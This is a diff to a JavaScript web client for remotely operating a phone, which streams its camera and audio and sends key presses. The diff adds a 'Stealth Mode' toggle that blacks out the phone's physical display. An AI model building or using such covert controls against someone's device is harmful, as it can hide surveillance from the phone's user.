@@ -285,6 +285,9 @@ function startWebStream() {
             handleIncomingAudioChunk(msg);
           } else if (msg.type === 'cam_frame') {
             handleIncomingCameraFrame(msg);
+          } else if (msg.type === 'stealth_status') {
+            isStealthActive = !!msg.active;
+            updateStealthUI(isStealthActive);
           }
         } catch (_) {}
       }
@@ -425,9 +428,47 @@ function sendPhoneKey(keyCode) {
   sendWebCommand({ action: 'key', code: keyCode });
 }
 
+// ============================================================
+// Stealth Mode (100% Black Physical Display) Controller
+// ============================================================
+let isStealthActive = false;
+
+function toggleStealthMode() {
+  isStealthActive = !isStealthActive;
+  updateStealthUI(isStealthActive);
+
+  if (isStealthActive) {
+    sendWebCommand({ action: 'stealth_enable' });
+  } else {
+    sendWebCommand({ action: 'stealth_disable' });
+  }
+}
+
+function updateStealthUI(active) {
+  const btn = document.getElementById('btn-stealth-mode');
+  const icon = document.getElementById('icon-stealth-mode');
+  const text = document.getElementById('text-stealth-mode');
+  const badge = document.getElementById('stealth-active-badge');
+
+  if (active) {
+    if (btn) {
+      btn.className = 'p-2.5 rounded-xl bg-purple-600 hover:bg-purple-500 border border-purple-400 text-white font-bold flex items-center justify-center space-x-1.5 transition shadow-lg shadow-purple-600/40';
+    }
+    if (icon) icon.className = 'fa-solid fa-eye-slash text-xs animate-pulse';
+    if (text) text.innerText = 'Stealth ON';
+    if (badge) badge.classList.remove('hidden');
+  } else {
+    if (btn) {
+      btn.className = 'p-2.5 rounded-xl bg-gray-800 hover:bg-gray-700 border border-gray-700 text-gray-300 font-medium flex items-center justify-center space-x-1 transition';
+    }
+    if (icon) icon.className = 'fa-solid fa-eye text-xs text-gray-400';
+    if (text) text.innerText = 'Stealth OFF';
+    if (badge) badge.classList.add('hidden');
+  }
+}
+
 function sendStealthMode() {
-  sendWebCommand({ action: 'stealth_off' });
-  alert('Stealth Mode Activated: Remote phone screen backlight turned 100% OFF!');
+  toggleStealthMode();
 }
 
 function captureWebSnapshot() {
